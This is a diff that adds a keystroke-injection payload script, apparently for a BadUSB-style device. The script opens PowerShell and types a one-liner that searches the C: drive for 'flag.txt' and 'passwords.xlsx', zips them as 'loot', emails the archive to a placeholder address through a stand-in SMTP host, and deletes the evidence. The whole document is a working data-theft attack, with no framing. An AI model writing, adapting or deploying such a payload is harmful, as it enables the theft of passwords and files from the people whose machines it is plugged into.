@@ -1,0 +1,5 @@
+Delay 2000
+RunWin powershell
+Delay 3000
+Print $p="C:\"; $t=@("flag.txt","passwords.xlsx"); $f=ls $p -Rec -Inc $t -Ea 0 | Sort Name -Unique; if($f){ $z="$env:TEMP\loot.zip"; Compress-Archive -Path $f.FullName -DestinationPath $z -Force; Send-MailMessage -To "YOUR_EMAIL@EXAMPLE.COM" -From "audit@target.local" -Sub "Loot Found" -Body "Found: $($f.Name)" -Smtp "smtp.example.com" -Att $z; rm $z }
+Press KEY_ENTER
